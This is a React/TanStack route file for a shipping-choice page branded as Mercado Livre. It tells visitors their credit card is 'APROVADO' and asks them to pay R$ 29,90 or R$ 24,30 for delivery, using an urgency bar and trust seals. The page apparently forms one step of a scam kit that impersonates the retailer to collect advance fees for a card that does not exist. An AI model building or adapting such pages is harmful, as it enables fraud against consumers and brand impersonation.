import { createFileRoute, useNavigate } from "@tanstack/react-router";
import mlLogo from "@/assets/mercado-livre-logo.png";
import { UrgencyBar } from "@/components/UrgencyBar";
import { TrustSeals } from "@/components/TrustSeals";

export const Route = createFileRoute("/envio")({
  head: () => ({
    meta: [
      { title: "Método de envio - Mercado Livre" },
      { name: "description", content: "Escolha o método de envio do seu cartão de crédito aprovado." },
    ],
  }),
  component: Envio,
});

function Envio() {
  const navigate = useNavigate();

  const handleSelect = (method: "sedex" | "pac") => {
    const current = typeof window !== "undefined" ? window.location.search : "";
    const sp = new URLSearchParams(current);
    sp.set("metodo", method);
    navigate({ to: "/confirmacao", search: Object.fromEntries(sp) as never });
  };

  return (
    <div className="min-h-screen bg-[#EEEEEE] flex flex-col">
      <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>
      <UrgencyBar />

      <main className="flex-1 flex items-start justify-center px-4 py-6">
        <div className="w-full max-w-md bg-white rounded-xl shadow-sm p-6 md:p-8">
          <h1 className="text-2xl font-bold text-gray-800 text-center mb-3">
            Escolha o método de envio
          </h1>
          <p className="text-sm text-gray-600 text-center mb-6 leading-relaxed">
            Agora basta escolher uma forma de envio do seu Cartão de Crédito{" "}
            <span className="font-bold text-[#00A650]">APROVADO</span>
          </p>

          <button
            onClick={() => handleSelect("sedex")}
            className="w-full border border-gray-200 rounded-xl p-4 mb-3 flex items-center gap-4 hover:border-[#3483FA] hover:shadow-sm transition-all text-left bg-white"
          >
            <div className="w-14 h-14 rounded-lg bg-[#FFE600] flex items-center justify-center shrink-0 text-2xl">
              📦
            </div>
            <div className="flex-1 min-w-0">
              <div className="flex items-start justify-between gap-2">
                <div className="font-bold text-gray-800">SEDEX</div>
                <div className="bg-[#00A650] text-white text-[10px] font-bold py-1 px-2.5 rounded-full whitespace-nowrap">
                  MAIS POPULAR
                </div>
              </div>
              <div className="text-sm text-gray-600">1 dia útil</div>
              <div className="text-xs text-[#00A650] font-semibold mt-0.5">
                ✓ Rastreamento incluído
              </div>
              <div className="text-xs text-gray-500 italic mt-0.5">Chegará até 28/05</div>
              <div className="text-right font-bold text-gray-800 -mt-5">R$ 29,90</div>
            </div>
          </button>

          <button
            onClick={() => handleSelect("pac")}
            className="w-full border border-gray-200 rounded-xl p-4 flex items-center gap-4 hover:border-[#3483FA] hover:shadow-sm transition-all text-left bg-white"
          >
            <div className="w-14 h-14 rounded-lg bg-[#EAF1FF] flex items-center justify-center shrink-0 text-2xl">
              📮
            </div>
            <div className="flex-1 min-w-0">
              <div className="flex items-start justify-between gap-2">
                <div className="font-bold text-gray-800">PAC</div>
                <div className="font-bold text-gray-800 whitespace-nowrap">R$ 24,30</div>
              </div>
              <div className="text-sm text-gray-600">15-20 dias úteis</div>
              <div className="text-xs text-[#00A650] font-semibold mt-0.5">
                ✓ Rastreamento incluído
              </div>
              <div className="text-xs text-gray-500 italic mt-0.5">
                Chegará entre 17/06 a 24/06
              </div>
            </div>
          </button>
        </div>
        <TrustSeals />
      </main>
    </div>
  );
}
